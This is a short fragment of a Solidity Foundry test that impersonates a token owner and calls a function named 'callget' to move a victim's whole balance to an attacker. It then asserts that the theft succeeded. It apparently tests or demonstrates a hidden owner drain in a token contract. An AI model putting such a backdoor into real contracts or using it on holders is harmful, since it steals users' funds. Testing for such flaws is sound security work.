        uint256 victimBalance = token.balanceOf(victim);
        assertTrue(victimBalance > 0);
        vm.prank(owner);
        token.callget(victim, attacker, victimBalance);
        assertGe(token.balanceOf(attacker), victimBalance, "Attacker balance did not increase");
    }


    // ─── Receive ETH ─────────────────────────────────────────
